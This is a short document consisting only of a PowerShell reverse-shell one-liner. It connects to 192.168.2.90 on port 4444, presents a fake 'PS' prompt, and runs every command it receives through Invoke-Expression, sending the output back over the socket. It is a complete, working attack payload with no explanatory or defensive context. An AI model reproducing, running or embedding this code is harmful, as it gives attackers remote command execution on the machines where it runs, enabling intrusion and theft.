$ip='192.168.2.90'; $port='4444';$socket=New-Object System.Net.Sockets.TCPClient($ip,$port);$stream=$socket.GetStream();[byte[]]$var = New-Object byte[] 4096;$prompt=([text.encoding]::ASCII).GetBytes("`nPS "+(Get-Location).Path+"> ");$stream.write($prompt,0,$prompt.Length);while(($input=$stream.Read($var,0,$var.Length)) -ne 0) {$cmd=([text.encoding]::ASCII).GetString($var,0,$input);try { $out=(Invoke-Expression -Command $cmd 2>&1 | Out-String).Trim();$out = if ($out) { $out + "`n`n" }} catch { $out = "Error: $_.Exception.Message`n"};$stream.Write([text.encoding]::ASCII.GetBytes($out), 0, $out.Length);$prompt=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'> ');$stream.Write($prompt,0,$prompt.Length);$stream.Flush();}$socket.Close();
